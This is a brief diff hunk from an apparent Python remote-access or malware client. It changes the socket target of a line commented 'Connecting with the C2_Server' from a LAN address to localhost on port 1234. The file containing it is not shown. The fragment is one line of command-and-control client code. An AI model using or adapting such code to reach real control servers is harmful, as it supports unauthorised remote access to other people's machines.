@@ -348,7 +348,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
 # Connecting with the C2_Server
-sock.connect(("192.168.0.110",1234))                               # change the ip and port
+sock.connect(("127.0.0.1",1234))                               # change the ip and port
 
 
 
